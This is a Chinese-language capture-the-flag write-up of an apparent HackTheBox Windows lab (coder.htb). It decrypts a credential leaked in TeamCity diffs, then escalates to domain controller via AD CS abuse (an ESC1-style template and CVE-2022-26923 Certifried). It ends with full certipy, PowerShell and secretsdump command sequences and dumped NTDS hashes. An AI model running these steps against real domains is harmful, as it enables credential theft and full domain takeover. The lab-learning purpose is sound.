<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Photoshop C:\TeamCity\buildAgent\conf*<span class="built_in">cat</span> buildAgent.properties</span><br><span class="line">serverUrl=http\://localhost\:8111</span><br><span class="line"></span><br><span class="line">systemDir=C\:\\TeamCity\\buildAgent\\system</span><br><span class="line">env.TEAMCITY_JRE=C\:\\TeamCity\\jre</span><br><span class="line">name=dc01</span><br><span class="line">tempDir=C\:\\TeamCity\\buildAgent\\temp</span><br><span class="line">workDir=C\:\\TeamCity\\buildAgent\\work</span><br><span class="line">ownPort=9090</span><br><span class="line"></span><br><span class="line">authorizationToken=63a48d52c4fac2ab6a14a633d4f17a46</span><br></pre></td></tr></table></figure>

<h1 id="to-Root"><a href="#to-Root" class="headerlink" title="to Root"></a>to Root</h1><h2 id="to-e-black"><a href="#to-e-black" class="headerlink" title="to e.black"></a>to e.black</h2><p>这里在 svc_teamcity 枚举半天没翻到有价值的信息，去看0xdf的wp</p>
<p>得知在 <code>C:\ProgramData\JetBrains\system</code> 路径下有个 changes 其中包含了迭代的diff</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">Photoshop C:\ProgramData\JetBrains\TeamCity\system\changes*cat 101.changes.diff</span><br><span class="line">diff --git a/Get-ADCS_Report.ps1 b/Get-ADCS_Report.ps1</span><br><span class="line">index d6515ce..a990b2e 100644</span><br><span class="line">--- a/Get-ADCS_Report.ps1</span><br><span class="line">+++ b/Get-ADCS_Report.ps1</span><br><span class="line">@@ -77,11 +77,15 @@ Function script:send_mail &#123;</span><br><span class="line">     [string]</span><br><span class="line">     $subject</span><br><span class="line">   )</span><br><span class="line">+</span><br><span class="line">+$key = Get-Content &quot;.\key.key&quot;</span><br><span class="line">+$pass = (Get-Content &quot;.\enc.txt&quot; | ConvertTo-SecureString -Key $key)</span><br><span class="line">+$cred = New-Object -TypeName System.Management.Automation.PSCredential (&quot;coder\e.black&quot;,$pass)</span><br><span class="line"> $emailFrom = &#x27;pkiadmins@coder.htb&#x27;</span><br><span class="line"> $emailCC = &#x27;e.black@coder.htb&#x27;</span><br><span class="line"> $emailTo = &#x27;itsupport@coder.htb&#x27;</span><br><span class="line"> $smtpServer = &#x27;smtp.coder.htb&#x27;</span><br><span class="line">-Send-MailMessage -SmtpServer $smtpServer -To $emailTo -Cc $emailCC -From $emailFrom -Subject $subject -Body $message -BodyAsHtml -Priority High</span><br><span class="line">+Send-MailMessage -SmtpServer $smtpServer -To $emailTo -Cc $emailCC -From $emailFrom -Subject $subject -Body $message -BodyAsHtml -Priority High -Credential $cred</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">diff --git a/enc.txt b/enc.txt</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000..d352634</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/enc.txt</span><br><span class="line">@@ -0,0 +1,2 @@</span><br><span class="line">+76492d1116743f0423413b16050a5345MgB8AGoANABuADUAMgBwAHQAaQBoAFMAcQB5AGoAeABlAEQAZgBSAFUAaQBGAHcAPQA9AHwANABhADcANABmAGYAYgBiAGYANQAwAGUAYQBkAGMAMQBjADEANAAwADkAOQBmADcAYQBlADkAMwAxADYAMwBjAGYAYwA4AGYAMQA3ADcAMgAxADkAYQAyAGYAYQBlADAAOQA3ADIAYgBmAGQAN</span><br><span class="line">+AA2AGMANQBlAGUAZQBhADEAZgAyAGQANQA3ADIAYwBjAGQAOQA1ADgAYgBjAGIANgBhAGMAZAA4ADYAMgBhADcAYQA0ADEAMgBiAGIAMwA5AGEAMwBhADAAZQBhADUANwBjAGQANQA1AGUAYgA2AGIANQA5AGQAZgBmADIAYwA0ADkAMgAxADAAMAA1ADgAMABhAA==</span><br><span class="line">diff --git a/key.key b/key.key</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000..a6285ed</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/key.key</span><br><span class="line">@@ -0,0 +1,32 @@</span><br><span class="line">+144</span><br><span class="line">+255</span><br><span class="line">+52</span><br><span class="line">+33</span><br><span class="line">+65</span><br><span class="line">+190</span><br><span class="line">+44</span><br><span class="line">+106</span><br><span class="line">+131</span><br><span class="line">+60</span><br><span class="line">+175</span><br><span class="line">+129</span><br><span class="line">+127</span><br><span class="line">+179</span><br><span class="line">+69</span><br><span class="line">+28</span><br><span class="line">+241</span><br><span class="line">+70</span><br><span class="line">+183</span><br><span class="line">+53</span><br><span class="line">+153</span><br><span class="line">+196</span><br><span class="line">+10</span><br><span class="line">+126</span><br><span class="line">+108</span><br><span class="line">+164</span><br><span class="line">+172</span><br><span class="line">+142</span><br><span class="line">+119</span><br><span class="line">+112</span><br><span class="line">+20</span><br><span class="line">+122</span><br></pre></td></tr></table></figure>

<p>没想通他们怎么会能找到这路径，然后能发现这下面的文件有用，目前唯一能解释得就是我枚举的还是不够，给我菜完了。</p>
<p>这个文件是以 <code>e.black@coder.htb</code> 账户身份发邮件。</p>
<p><code>e.black</code> 凭据enc由key加密，所以在本地导入一下这俩解密即可得到 <code>e.black</code> 凭据。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Photoshop C:\TeamCity\buildAgent\work\<span class="number">74</span>c2f03019966b3e*<span class="variable">$key</span> = <span class="built_in">cat</span> ./key.txt</span><br><span class="line">Photoshop C:\TeamCity\buildAgent\work\<span class="number">74</span>c2f03019966b3e*<span class="variable">$pass</span> = (<span class="built_in">cat</span> ./enc.txt | <span class="built_in">ConvertTo-SecureString</span> <span class="literal">-Key</span> <span class="variable">$key</span>)</span><br><span class="line">Photoshop C:\TeamCity\buildAgent\work\<span class="number">74</span>c2f03019966b3e*[<span class="type">System.Net.NetworkCredential</span>]::new(<span class="string">&quot;&quot;</span>, <span class="variable">$pass</span>).Password</span><br><span class="line">ypOSJXPqlDOxxbQSfEERy300</span><br></pre></td></tr></table></figure>

<p>这个账户在远程管理组里，所以得到密码winrm即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.207 -u e.black  -p ypOSJXPqlDOxxbQSfEERy300</span><br></pre></td></tr></table></figure>

<h2 id="to-DC"><a href="#to-DC" class="headerlink" title="to DC"></a>to DC</h2><p>先枚举 <code>e.black</code> 账户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(LDAPS)-[dc01.coder.htb]-[CODER\s.blade]</span><br><span class="line">PV &gt; Get-DomainUser e.black</span><br><span class="line">cn                                : Erron Black</span><br><span class="line">distinguishedName                 : CN=Erron Black,CN=Users,DC=coder,DC=htb</span><br><span class="line">memberOf                          : CN=PKI Admins,CN=Users,DC=coder,DC=htb</span><br><span class="line">                                    CN=Remote Management Users,CN=Builtin,DC=coder,DC=htb</span><br><span class="line">name                              : Erron Black</span><br><span class="line">objectGUID                        : &#123;c8f89a02-01bf-4b74-bbf8-9bcc688ce678&#125;</span><br><span class="line">userAccountControl                : NORMAL_ACCOUNT [66048]</span><br><span class="line">                                    DONT_EXPIRE_PASSWORD</span><br><span class="line">badPwdCount                       : 0</span><br><span class="line">badPasswordTime                   : 01/01/1601 00:00:00 (424 years, 6 months ago)</span><br><span class="line">lastLogoff                        : 1601-01-01 00:00:00+00:00</span><br><span class="line">lastLogon                         : 08/11/2022 22:05:01 (2 years, 8 months ago)</span><br><span class="line">pwdLastSet                        : 07/11/2022 19:40:31 (2 years, 8 months ago)</span><br><span class="line">primaryGroupID                    : 513</span><br><span class="line">objectSid                         : S-1-5-21-2608251805-3526430372-1546376444-1106</span><br><span class="line">sAMAccountName                    : e.black</span><br><span class="line">sAMAccountType                    : SAM_USER_OBJECT</span><br><span class="line">userPrincipalName                 : e.black@coder.htb</span><br><span class="line">objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=coder,DC=htb</span><br></pre></td></tr></table></figure>

<p>这个账户属于 <code>PKI Admins</code> 组，从下文可得知，<code>PKI Admins</code> 通常有权限管理证书.</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.linkedin.com/pulse/attack-vectors-against-active-directory-certificate-services-patel-bpcyf">https://www.linkedin.com/pulse/attack-vectors-against-active-directory-certificate-services-patel-bpcyf</a></p>
</blockquote>
<p>但是这里我尝试certipy对证书模板直接进行修改，权限是不足的。</p>
<p>我没找到比较好的远程创建证书的方式，但是我也不想造轮子。</p>
<p>所以在服务器上用 <a target="_blank" rel="noopener" href="https://github.com/GoateePFE/ADCSTemplate?tab=readme-ov-file#new-adcstemplate"><code>ADCSTemplate</code></a> 直接创建了一张包含esc1证书的模板注册给了 <code>e.black</code></p>
<p>这里奇怪的是虽然e.black在 <code>pkI ADMIN</code> 组内，但我下发了一张没有启用的证书模板时，我尝试用 <code>certipy</code> 进行启用，却提示权限不足，尝试列出证书模板也是同样。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ certipy ca -u e.black@coder.htb -p ypOSJXPqlDOxxbQSfEERy300 -dc-ip 10.10.11.207 -ca coder-DC01-CA -enable-template test</span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[-] Access denied: Insufficient permissions to get templates</span><br></pre></td></tr></table></figure>

<p>同理在系统内直接 <code>add</code> 也是如此，仿佛就只给了创建证书权限似的，很怪。</p>
<p>后来看了下脚本是直接用 <code>Set-ADObject</code> 启用的，嗦嘚速内。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">If ($Publish) &#123;</span><br><span class="line">    ### WARNING: Issues on all available CAs. Test in your environment.</span><br><span class="line">    $EnrollmentPath = &quot;CN=Enrollment Services,CN=Public Key Services,CN=Services,$ConfigNC&quot;</span><br><span class="line">    $CAs = Get-ADObject -SearchBase $EnrollmentPath -SearchScope OneLevel -Filter * -Server $Server</span><br><span class="line">    ForEach ($CA in $CAs) &#123;</span><br><span class="line">        Set-ADObject -Identity $CA.DistinguishedName -Add @&#123;certificateTemplates=$DisplayName.Replace(&#x27; &#x27;,&#x27;&#x27;)&#125; -Server $Server</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以只好在创建阶段直接启用。</p>
<p>打完之后翻看别人wp好像是个非预期，预期是 cve-2022-29623 要用到一开始的 <code>s.blade</code> 给 <code>buildagent</code> ou添加账户的权限，所以这里着重记录 <code>cve-2022-29623</code>.</p>
<h3 id="cve-2022-29623"><a href="#cve-2022-29623" class="headerlink" title="cve-2022-29623"></a>cve-2022-29623</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4</a></p>
</blockquote>
<p>这个漏洞通俗来说是通过优先校验dns名来匹配证书下发，导致的可以滥用dns获取域内任意目标证书，和后来的几个esc10和esc14一定程度上有点点相似，不过这个是逻辑处理上有问题。</p>
<p>在文章中有指出，这个漏洞已经修复了但是嵌入 <code>CT_FLAG_NO_SECURITY_EXTENSION</code> 标识的模板仍然可以利用，最基础的是需要对dNSHostName属性有写入权限。</p>
<blockquote>
<p>微软在2022 年 5 月的安全更新中修补了此漏洞，通过在新证书中引入新的对象 ID (OID) 来进一步识别用户。这是通过将用户的objectSid(SID) 嵌入新的szOID_NTDS_CA_SECURITY_EXT( 1.3.6.1.4.1.311.25.2) OID 中来实现的。在属性中设置了新CT_FLAG_NO_SECURITY_EXTENSION( 0x80000) 标志的证书模板msPKI-Enrollment-Flag将不会嵌入新的szOID_NTDS_CA_SECURITY_EXTOID，因此这些模板仍然容易受到此攻击。虽然不太可能设置此标志，但您应该注意打开此标志的含义。此外，“已验证的对 DNS 主机名的写入”权限现在只允许设置与dNSHostName帐户的 SAM 帐户名匹配的属性。但是，如果拥有对计算机帐户的通用写入权限，仍然可以创建重复的dNSHostName值。</p>
</blockquote>
<p>回到最开始s.blade的权限部分</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PV &gt; <span class="built_in">Get-DomainObjectAcl</span>  <span class="literal">-SecurityIdentifier</span>  S<span class="literal">-1-5-21-2608251805-3526430372-1546376444-8601</span> <span class="literal">-ResolveGUIDs</span> </span><br><span class="line"></span><br><span class="line">ObjectDN                    : OU=BuildAgents,OU=Development,DC=coder,DC=htb</span><br><span class="line">ObjectSID                   : None</span><br><span class="line">ACEType                     : ACCESS_ALLOWED_OBJECT_ACE</span><br><span class="line">ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE</span><br><span class="line">AccessMask                  : ReadProperty, WriteProperty, Self</span><br><span class="line">ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT</span><br><span class="line">ObjectAceType               : DNS Host Name Attributes (<span class="number">72</span>e39547<span class="literal">-7b18-11d1-adef-00c04fd8d5cd</span>)</span><br><span class="line">InheritanceType             : UNKNOWN (bf967a86<span class="literal">-0de6-11d0-a285-00aa003049e2</span>)</span><br><span class="line">SecurityIdentifier          : BuildAgent Mgmt (S<span class="literal">-1-5-21-2608251805-3526430372-1546376444-8601</span>)</span><br><span class="line"></span><br><span class="line">ObjectDN                    : OU=BuildAgents,OU=Development,DC=coder,DC=htb</span><br><span class="line">ObjectSID                   : None</span><br><span class="line">ACEType                     : ACCESS_ALLOWED_OBJECT_ACE</span><br><span class="line">ACEFlags                    : CONTAINER_INHERIT_ACE</span><br><span class="line">AccessMask                  : CreateChild, DeleteChild</span><br><span class="line">ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT</span><br><span class="line">ObjectAceType               : UNKNOWN (bf967a86<span class="literal">-0de6-11d0-a285-00aa003049e2</span>)</span><br><span class="line">InheritanceType             : None</span><br><span class="line">SecurityIdentifier          : BuildAgent Mgmt (S<span class="literal">-1-5-21-2608251805-3526430372-1546376444-8601</span>)</span><br></pre></td></tr></table></figure>

<p>这里 <code>s.blade</code> 能够对 <code>BuildAgents</code> OU 内创建账户，以及对其有 <code>DNS Host Name</code> 的修改权限 </p>
<p>这个漏洞在文章中有重点解释的一点是，在当我们创建了主机账户 创建者对被创建主机持有 <code>Validated write to service principal name</code> 这一权限，这导致创建者在修改主机账户的dnshostname进行其他账户的伪造时，系统会依据账户的 <code>dnshostname</code> 更新这个账户 <code>spn</code> 中host的部分，并会检测spn中这个host的唯一性。</p>
<p>这是理所当然的，因为在同一个林中spn必须是唯一的，所以就会和同名的目标对象进行spn上的冲突，针对这一点具体的解释可以看下文。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/troubleshoot/windows-server/windows-security/kerberos-error-kdc-err-s-principal-unknown-or-not-unique">https://learn.microsoft.com/zh-cn/troubleshoot/windows-server/windows-security/kerberos-error-kdc-err-s-principal-unknown-or-not-unique</a></p>
</blockquote>
<p>为了规避，由修改dnshostname导致spn与目标spn撞了从而导致的dnshostname修改失败， 作者 <a target="_blank" rel="noopener" href="https://twitter.com/ly4k_"><code>Oliver Lyak</code></a>  采取的方式是，把把spn里会伴随着dnshostname的spn先扬了，再进行dnshostname的修改 <del>是个人物XD</del> .</p>
<p><img src="https://image.baidu.com/search/down?url=http://tvax4.sinaimg.cn/mw690/0065CzJOly1i3bh38qi42j30vs0pmwto.jpg" alt="image"></p>
<p>既然知道了原理，就先创建这个证书，这里我用的和在esc1部分一样，用的machine的模板。</p>
<p>修改证书</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import-module ./ADCSTemplate.psm1</span><br><span class="line"></span><br><span class="line">Export-ADCSTemplate -DisplayName computer &gt; com.json</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp</span> = <span class="built_in">cat</span> com.json -raw | ConvertFrom-Json</span><br><span class="line"></span><br><span class="line"><span class="comment">## 附加 NoSecurityExtension</span></span><br><span class="line"><span class="variable">$tmp</span>.<span class="string">&quot;msPKI-Enrollment-Flag&quot;</span> = 524288</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp</span>|Convertto-json &gt; computer.json</span><br><span class="line"></span><br><span class="line">New-ADCSTemplate -DisplayName <span class="built_in">test</span> -JSON (<span class="built_in">cat</span> ./computer.json -raw) -Publish</span><br></pre></td></tr></table></figure>

<p>这里需要先创建用户再应用模板</p>
<p>certipy中已经具备了创建账户时，指定dns以及剔除冲突的spn，不需要手动再去删了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ certipy account create -u <span class="string">&#x27;s.blade@coder.htb&#x27;</span> -p <span class="string">&#x27;AmcwNO60Zg3vca3o0HDrTC6D&#x27;</span> -user <span class="string">&quot;test&quot;</span> -dns dc01.coder.htb -dc-ip 10.10.11.207 -group <span class="string">&quot;OU=BUILDAGENTS,OU=DEVELOPMENT,DC=CODER,DC=HTB&quot;</span></span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Creating new account:</span><br><span class="line">    sAMAccountName                      : <span class="built_in">test</span>$</span><br><span class="line">    unicodePwd                          : 4kNGC5ZWCSldSuYw</span><br><span class="line">    userAccountControl                  : 4096</span><br><span class="line">    servicePrincipalName                : HOST/test</span><br><span class="line">                                          RestrictedKrbHost/test</span><br><span class="line">    dnsHostName                         : dc01.coder.htb</span><br><span class="line">[*] Successfully created account <span class="string">&#x27;test$&#x27;</span> with password <span class="string">&#x27;4kNGC5ZWCSldSuYw&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后添加 <code>test$</code> 请求证书的权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADCSTemplateACL</span> <span class="literal">-DisplayName</span> test <span class="literal">-Type</span> Allow <span class="literal">-Identity</span> <span class="string">&#x27;coder\test$&#x27;</span> <span class="literal">-Enroll</span></span><br></pre></td></tr></table></figure>

<p>查看证书</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">34    </span><br><span class="line">  Template Name                       : test</span><br><span class="line">  Display Name                        : test</span><br><span class="line">  Enabled                             : True</span><br><span class="line">  Client Authentication               : True</span><br><span class="line">  Enrollment Agent                    : False</span><br><span class="line">  Any Purpose                         : False</span><br><span class="line">  Enrollee Supplies Subject           : False</span><br><span class="line">  Certificate Name Flag               : SubjectAltRequireDns</span><br><span class="line">                                        SubjectRequireDnsAsCn</span><br><span class="line">  Enrollment Flag                     : NoSecurityExtension</span><br><span class="line">  Extended Key Usage                  : Server Authentication</span><br><span class="line">                                        Client Authentication</span><br><span class="line">  Requires Manager Approval           : False</span><br><span class="line">  Requires Key Archival               : False</span><br><span class="line">  Authorized Signatures Required      : 0</span><br><span class="line">  Schema Version                      : 1</span><br><span class="line">  Validity Period                     : 1 year</span><br><span class="line">  Renewal Period                      : 6 weeks</span><br><span class="line">  Minimum RSA Key Length              : 2048</span><br><span class="line">  Template Created                    : 2025-07-8T16:55:44+00:00</span><br><span class="line">  Template Last Modified              : 2025-07-8T16:55:49+00:00</span><br><span class="line">  Permissions </span><br><span class="line">    Enrollment Permissions            </span><br><span class="line">      Enrollment Rights               : CODER.HTB\test</span><br><span class="line">    Object Control Permissions</span><br><span class="line">      Owner                           : CODER.HTB\Erron Black</span><br><span class="line">      Full Control Principals         : CODER.HTB\Domain Admins</span><br><span class="line">                                        CODER.HTB\Local System</span><br><span class="line">                                        CODER.HTB\Enterprise Admins</span><br><span class="line">      Write Owner Principals          : CODER.HTB\Domain Admins</span><br><span class="line">                                        CODER.HTB\Local System</span><br><span class="line">                                        CODER.HTB\Enterprise Admins</span><br><span class="line">      Write Dacl Principals           : CODER.HTB\Domain Admins</span><br><span class="line">                                        CODER.HTB\Local System</span><br><span class="line">                                        CODER.HTB\Enterprise Admins</span><br></pre></td></tr></table></figure>

<p>确认模板没问题就请求证书。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ certipy req -u <span class="string">&#x27;test$@coder.htb&#x27;</span> -p 4kNGC5ZWCSldSuYw -dc-ip  10.10.11.207 -template testa -ca coder-DC01-CA</span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Request ID is 20</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Got certificate with DNS Host Name <span class="string">&#x27;dc01.coder.htb&#x27;</span></span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Try using -sid to <span class="built_in">set</span> the object SID or see the wiki <span class="keyword">for</span> more details</span><br><span class="line">[*] Saving certificate and private key to <span class="string">&#x27;dc01.pfx&#x27;</span></span><br><span class="line">File <span class="string">&#x27;dc01.pfx&#x27;</span> already exists. Overwrite? (y/n - saying no will save with a unique filename): dc01</span><br><span class="line">[*] Wrote certificate and private key to <span class="string">&#x27;dc01_5c498701-911f-4ce9-ac88-239fd1297a82.pfx&#x27;</span></span><br></pre></td></tr></table></figure>

<p>获取 <code>dc</code> hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ certipy auth -pfx dc01_5c498701-911f-4ce9-ac88-239fd1297a82.pfx -dc-ip 10.10.11.207</span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Certificate identities:</span><br><span class="line">[*]     SAN DNS Host Name: <span class="string">&#x27;dc01.coder.htb&#x27;</span></span><br><span class="line">[*] Using principal: <span class="string">&#x27;dc01$@coder.htb&#x27;</span></span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saving credential cache to <span class="string">&#x27;dc01.ccache&#x27;</span></span><br><span class="line">[*] Wrote credential cache to <span class="string">&#x27;dc01.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;dc01$&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;dc01$@coder.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:56dc040d21ac40b33206ce0c2f164f94</span><br></pre></td></tr></table></figure>

<h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-secretsdump -dc-ip 10.10.11.207 coder.htb/<span class="string">&#x27;dc01$&#x27;</span>@10.10.11.207 -hashes :56dc040d21ac40b33206ce0c2f164f94</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:807726fcf9f188adc26eeafd7dc16bb7:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:26000ce1f6ca4029ec5d3a95631e797c:::</span><br><span class="line">coder.htb\e.black:1106:aad3b435b51404eeaad3b435b51404ee:e1b96bbb66a073787a3310b5a956200d:::</span><br><span 